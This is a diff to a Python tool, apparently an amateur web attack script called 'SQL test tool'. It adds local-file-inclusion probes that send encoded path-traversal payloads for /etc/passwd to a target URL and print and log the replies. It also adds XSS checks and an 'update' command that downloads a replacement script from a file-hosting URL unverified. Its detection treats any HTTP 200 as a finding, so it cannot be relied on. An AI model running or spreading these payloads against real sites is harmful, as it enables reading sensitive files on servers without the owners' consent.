@@ -16,8 +16,6 @@ import os
 #os.system("python -m pip install --upgrade pip")
 #os.system("python -m pip install pywin32")
 #os.system("python -m pip install --upgrade pip")
-#os.system("python -m pip install cryptography" )
-#os.system("python -m pip install --upgrade pip")
 #os.system("python -m pip install win32gui")
 #os.system("python -m pip install --upgrade pip")
 #os.system("python -m pip install secure-smtplib")
@@ -145,7 +143,8 @@ started = f"""
 {red}00101010101101010001010101010110010101010101101010101010101010101010101010100101010110101010000101010100101010110100101010101010101010110101010101010101
 {red}Commands:
 {magenta} SQL injection (With this command, you can find and exploit the vulnerability of the site)
-{blue} Exit (With this command, you can Exit the tool)
+{blue} EXIT (With this command, you can Exit the tool)
+{red} update (With this command, you can update the tool and after that tool will install a new version of SQL test tool)
 
 
 """
@@ -167,22 +166,24 @@ except:
 inuy = input(Fore.LIGHTBLUE_EX+" ┌─["+Fore.LIGHTRED_EX+"SQL"+Fore.BLUE+"~"+Fore.WHITE+"@TEST"+Fore.LIGHTBLUE_EX+"""]
  └──╼ """+Fore.WHITE+"> ")
 
-if inuy == "Exit":
-
- pyautogui.hotkey('ctrl', 'c')
-if inuy == "SQL injection":
-  red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;
+if inuy == "EXIT": pyautogui.hotkey('ctrl', 'c')
+ 
+elif inuy == "update": f=urllib.request.urlretrieve('https://s32.picofile.com/d/8478419184/e4e799c6-3265-44ce-ba71-c95bd25d88a9/sql.py' , 'sql.py')
+#time.sleep(3)
+elif inuy == "SQL injection":
+    
+ red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;
 #################################################################################################################################################################################################################
 #check the internet
 while True:
     try:
         
-        code = input(Fore.BLUE+"enter the token please:")
+        code = input(Fore.BLUE+"enter the token for continue please:")
         if code == "4l00r84SSVLZ2Abv0dT2m6wyKL1jrqgj3mJ1U6wcPqjQD1X8Ln7KBwbU^bQ72Vm;wGi3NT5rcl2L26£#[P094fU6cKopO{u48ibOLAqAEjW&£QnEMnL+AgS;JFRPAJ":
             break
     except:
         
-        pyautogui.hotkey('ctrl', 'c')
+     print("wrong password try again")
 ###########################################################################################################################################################################################################################
 #####################################################################################################################################################################################################################
 Q = input(Fore.GREEN+"Create a  username for yourself:")
@@ -1535,6 +1536,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
 started = f"""
 {red}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1569,6 +1576,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
 started = f"""
 {green}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1603,6 +1616,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
 started = f"""
 {red}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1637,6 +1656,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
 started = f"""
 {yellow}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1671,6 +1696,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
 started = f"""
 {yellow}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1690,6 +1721,128 @@ try:
 except:
     pass
 time.sleep(3)
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+print(Fore.RED+"  testing the  %uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215/etc/passwd  ")
+RLCXSTEGASB = '%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215/etc/passwd '
+url = (f"{tye}{RLCXSTEGASB} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+JSTGV = print(Fore.RED+f" parameter:{tye}{RLCXSTEGASB}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
+started = f"""
+{yellow}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep(3)
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+print(Fore.RED+"  testing the  ./.././.././.././.././.././.././.././..//etc/passwd  ")
+RLCXSTEGASBTT = './.././.././.././.././.././.././.././..//etc/passwd '
+url = (f"{tye}{RLCXSTEGASBTT} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+JSTGV = print(Fore.RED+f" parameter:{tye}{RLCXSTEGASBTT}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
+started = f"""
+{yellow}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep(3)
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+print(Fore.RED+"  testing the  \.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\/etc/passwd  ")
+RLCXSTEGASBTTZ = '\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\/etc/passwd '
+url = (f"{tye}{RLCXSTEGASBTTZ} ")
+response = requests.get(url)
+
+print(colored(f"Status Code: {response.status_code}", "green"))
+print(colored(f"Content Type: {response.headers['content-type']}", "green"))
+print(colored("Response Text:", "green"))
+print(Fore.RED+ response.text)
+JSTGV = print(Fore.RED+f" parameter:{tye}{RLCXSTEGASBTTZ}")
+file_name = "log.txt"
+file = open( file_name, "a+" )
+file.write(f"{response.text}")
+file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"LFI found / status code is 200! it can be a LFI check it!!!!")
+else :
+ print(Fore.RED+"no LFI!!!!!! but still check it!!!!")
+started = f"""
+{yellow}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
+"""
+
+pass
+
+try:
+    def printl(Str):
+        for char in Str:
+            print(char, end='', flush=True)
+            time.sleep(0.009)
+except:
+    pass
+
+try:
+    printl(started)
+except:
+    pass
+time.sleep(6)
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+print(Fore.YELLOW+"DONE //////  LFI testing is done /// hope to find what you want /// okkkk yeppppppppp /// ")
 ##############################################################################################################################################################################################################################
 time.sleep(4)
 started = f"""
@@ -1722,14 +1875,12 @@ try:
 except:
     pass
 #########################################################################################################################################################################################################################################################################
-M =input(Fore.BLUE+"If you want to continue working with the tool, please type CVE(tool will test the CVEs!) if your site is wordpress you can go to the next part but if your site is not wordpress type the EXIT  / or if you want to end the working of the tool, type the word EXIT:")
-if M == "EXIT":
- pyautogui.hotkey('ctrl', 'c')
+M =input(Fore.BLUE+"If you want to continue working with the tool, please press ENTER(tool will test the CVEs!) if your site is wordpress you can go to the next part but if your site is not wordpress please press the CTRL + C to quit the tool thanks (:")
 
-if M == "CVE":
- print(Fore.RED+"""
+
+print(Fore.RED+"""
             ||||||||||||||
-           =              \       ,
+           =              \       
            =               |
           _=            ___/
          / _\           (o)\
@@ -1744,7 +1895,7 @@ if M == "CVE":
         \/ \    /           __/___  ====_/
          \/ \  /           (O____)\\_(_/
                           (O_ ____)
-                           (O____)⠀
+                           (O____)
         
           </> SQL test tool </>
 """       )
@@ -1793,6 +1944,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
 started = f"""
 {blue}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1828,6 +1985,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
 started = f"""
 {blue}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1863,6 +2026,12 @@ file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
 started = f"""
 {red}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1893,11 +2062,17 @@ print(colored(f"Status Code: {response.status_code}", "green"))
 print(colored(f"Content Type: {response.headers['content-type']}", "green"))
 print(colored("Response Text:", "green"))
 print(Fore.RED+ response.text)
-fh = print(Fore.RED+f" parameter:{XZB}{RR}")
+fh = print(Fore.RED+f" parameter:{XZB}{RRFGK}")
 file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
 started = f"""
 {blue}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
@@ -1928,11 +2103,17 @@ print(colored(f"Status Code: {response.status_code}", "green"))
 print(colored(f"Content Type: {response.headers['content-type']}", "green"))
 print(colored("Response Text:", "green"))
 print(Fore.RED+ response.text)
-fh = print(Fore.RED+f" parameter:{XZB}{RR}")
+fh = print(Fore.RED+f" parameter:{XZB}{RRFGKCV}")
 file_name = "log.txt"
 file = open( file_name, "a+" )
 file.write(f"{response.text}")
 file.close()
+
+if response.status_code == 200:
+
+  print(Fore.GREEN+"xss found / status code is 200! it can be a xss check it!!!!")
+else :
+ print(Fore.RED+"no xss!!!!!! but still check it!!!!")
 started = f"""
 {green}-------------------------------------------------------------------------------------------------------------------------------------------------------------              
 """
